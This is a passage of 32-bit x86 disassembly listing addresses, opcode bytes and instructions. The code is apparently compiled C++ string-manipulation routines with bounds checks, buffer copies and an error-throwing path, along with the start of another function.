  404f0d:	1f 84 00 00 00 00 00 
  404f14:	80 7b 01 00          	cmpb   $0x0,0x1(%ebx)
  404f18:	8d 5b 01             	lea    0x1(%ebx),%ebx
  404f1b:	75 f7                	jne    0x404f14
  404f1d:	29 fb                	sub    %edi,%ebx
  404f1f:	85 ff                	test   %edi,%edi
  404f21:	74 39                	je     0x404f5c
  404f23:	8b 46 18             	mov    0x18(%esi),%eax
  404f26:	8d 6e 04             	lea    0x4(%esi),%ebp
  404f29:	83 f8 10             	cmp    $0x10,%eax
  404f2c:	72 11                	jb     0x404f3f
  404f2e:	8b 4d 00             	mov    0x0(%ebp),%ecx
  404f31:	39 f9                	cmp    %edi,%ecx
  404f33:	77 27                	ja     0x404f5c
  404f35:	83 f8 10             	cmp    $0x10,%eax
  404f38:	72 0d                	jb     0x404f47
  404f3a:	8b 55 00             	mov    0x0(%ebp),%edx
  404f3d:	eb 0a                	jmp    0x404f49
  404f3f:	89 e9                	mov    %ebp,%ecx
  404f41:	39 f9                	cmp    %edi,%ecx
  404f43:	76 f0                	jbe    0x404f35
  404f45:	eb 15                	jmp    0x404f5c
  404f47:	89 ea                	mov    %ebp,%edx
  404f49:	8b 4e 14             	mov    0x14(%esi),%ecx
  404f4c:	01 ca                	add    %ecx,%edx
  404f4e:	39 fa                	cmp    %edi,%edx
  404f50:	76 0a                	jbe    0x404f5c
  404f52:	83 f8 10             	cmp    $0x10,%eax
  404f55:	72 5d                	jb     0x404fb4
  404f57:	8b 55 00             	mov    0x0(%ebp),%edx
  404f5a:	eb 5a                	jmp    0x404fb6
  404f5c:	83 ec 04             	sub    $0x4,%esp
  404f5f:	6a 00                	push   $0x0
  404f61:	53                   	push   %ebx
  404f62:	56                   	push   %esi
  404f63:	e8 28 fb ff ff       	call   0x404a90
  404f68:	83 c4 10             	add    $0x10,%esp
  404f6b:	84 c0                	test   %al,%al
  404f6d:	74 3b                	je     0x404faa
  404f6f:	8b 46 18             	mov    0x18(%esi),%eax
  404f72:	8d 6e 04             	lea    0x4(%esi),%ebp
  404f75:	83 f8 10             	cmp    $0x10,%eax
  404f78:	72 09                	jb     0x404f83
  404f7a:	8b 4d 00             	mov    0x0(%ebp),%ecx
  404f7d:	85 db                	test   %ebx,%ebx
  404f7f:	75 08                	jne    0x404f89
  404f81:	eb 17                	jmp    0x404f9a
  404f83:	89 e9                	mov    %ebp,%ecx
  404f85:	85 db                	test   %ebx,%ebx
  404f87:	74 11                	je     0x404f9a
  404f89:	83 ec 04             	sub    $0x4,%esp
  404f8c:	53                   	push   %ebx
  404f8d:	57                   	push   %edi
  404f8e:	51                   	push   %ecx
  404f8f:	e8 1c c9 00 00       	call   0x4118b0
  404f94:	83 c4 10             	add    $0x10,%esp
  404f97:	8b 46 18             	mov    0x18(%esi),%eax
  404f9a:	83 f8 10             	cmp    $0x10,%eax
  404f9d:	72 03                	jb     0x404fa2
  404f9f:	8b 6d 00             	mov    0x0(%ebp),%ebp
  404fa2:	89 5e 14             	mov    %ebx,0x14(%esi)
  404fa5:	c6 44 1d 00 00       	movb   $0x0,0x0(%ebp,%ebx,1)
  404faa:	89 f0                	mov    %esi,%eax
  404fac:	83 c4 0c             	add    $0xc,%esp
  404faf:	5e                   	pop    %esi
  404fb0:	5f                   	pop    %edi
  404fb1:	5b                   	pop    %ebx
  404fb2:	5d                   	pop    %ebp
  404fb3:	c3                   	ret
  404fb4:	89 ea                	mov    %ebp,%edx
  404fb6:	29 d7                	sub    %edx,%edi
  404fb8:	89 ca                	mov    %ecx,%edx
  404fba:	29 fa                	sub    %edi,%edx
  404fbc:	0f 82 81 00 00 00    	jb     0x405043
  404fc2:	39 da                	cmp    %ebx,%edx
  404fc4:	77 02                	ja     0x404fc8
  404fc6:	89 d3                	mov    %edx,%ebx
  404fc8:	01 fb                	add    %edi,%ebx
  404fca:	39 d9                	cmp    %ebx,%ecx
  404fcc:	0f 82 81 00 00 00    	jb     0x405053
  404fd2:	83 f8 0f             	cmp    $0xf,%eax
  404fd5:	77 04                	ja     0x404fdb
  404fd7:	89 e8                	mov    %ebp,%eax
  404fd9:	eb 03                	jmp    0x404fde
  404fdb:	8b 46 04             	mov    0x4(%esi),%eax
  404fde:	89 5e 14             	mov    %ebx,0x14(%esi)
  404fe1:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  404fe5:	8b 5e 14             	mov    0x14(%esi),%ebx
  404fe8:	39 fb                	cmp    %edi,%ebx
  404fea:	76 3e                	jbe    0x40502a
  404fec:	85 ff                	test   %edi,%edi
  404fee:	74 ba                	je     0x404faa
  404ff0:	8b 46 04             	mov    0x4(%esi),%eax
  404ff3:	8b 4e 18             	mov    0x18(%esi),%ecx
  404ff6:	83 f9 0f             	cmp    $0xf,%ecx
  404ff9:	89 c2                	mov    %eax,%edx
  404ffb:	77 02                	ja     0x404fff
  404ffd:	89 ea                	mov    %ebp,%edx
  404fff:	29 fb                	sub    %edi,%ebx
  405001:	74 16                	je     0x405019
  405003:	01 d7                	add    %edx,%edi
  405005:	83 ec 04             	sub    $0x4,%esp
  405008:	53                   	push   %ebx
  405009:	57                   	push   %edi
  40500a:	52                   	push   %edx
  40500b:	e8 b9 c9 00 00       	call   0x4119c9
  405010:	83 c4 10             	add    $0x10,%esp
  405013:	8b 46 04             	mov    0x4(%esi),%eax
  405016:	8b 4e 18             	mov    0x18(%esi),%ecx
  405019:	83 f9 0f             	cmp    $0xf,%ecx
  40501c:	77 02                	ja     0x405020
  40501e:	89 e8                	mov    %ebp,%eax
  405020:	89 5e 14             	mov    %ebx,0x14(%esi)
  405023:	01 d8                	add    %ebx,%eax
  405025:	c6 00 00             	movb   $0x0,(%eax)
  405028:	eb 80                	jmp    0x404faa
  40502a:	83 7e 18 0f          	cmpl   $0xf,0x18(%esi)
  40502e:	76 03                	jbe    0x405033
  405030:	8b 6e 04             	mov    0x4(%esi),%ebp
  405033:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  40503a:	c6 45 00 00          	movb   $0x0,0x0(%ebp)
  40503e:	e9 67 ff ff ff       	jmp    0x404faa
  405043:	83 ec 0c             	sub    $0xc,%esp
  405046:	68 18 25 42 00       	push   $0x422518
  40504b:	e8 c8 96 00 00       	call   0x40e718
  405050:	83 c4 0c             	add    $0xc,%esp
  405053:	83 ec 0c             	sub    $0xc,%esp
  405056:	68 18 25 42 00       	push   $0x422518
  40505b:	e8 b8 96 00 00       	call   0x40e718
  405060:	83 c4 0c             	add    $0xc,%esp
  405063:	90                   	nop
  405064:	55                   	push   %ebp
  405065:	89 e5                	mov    %esp,%ebp
  405067:	53                   	push   %ebx
  405068:	57                   	push   %edi
  405069:	56                   	push   %esi
  40506a:	83 ec 6c             	sub    $0x6c,%esp
  40506d:	8b 75 0c             	mov    0xc(%ebp),%esi
  405070:	8b 45 08             	mov    0x8(%ebp),%eax
  405073:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405076:	c7 45 b0 ec 04 42 00 	movl   $0x4204ec,-0x50(%ebp)
  40507d:	c7 45 b4 34 27 42 00 	movl   $0x422734,-0x4c(%ebp)
  405084:	89 6d b8             	mov    %ebp,-0x48(%ebp)
  405087:	89 65 c0             	mov    %esp,-0x40(%ebp)
  40508a:	c7 45 b8 84 51 40 00 	movl   $0x405184,-0x48(%ebp)
  405091:	8d 45 94             	lea    -0x6c(%ebp),%eax
  405094:	e8 bc c0 01 00       	call   0x421155
  405099:	3b 75 10             	cmp    0x10(%ebp),%esi
  40509c:	0f 84 ab 00 00 00    	je     0x40514d
  4050a2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050a5:	83 c0 04             	add    $0x4,%eax
  4050a8:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4050ab:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4050b2:	00 00 
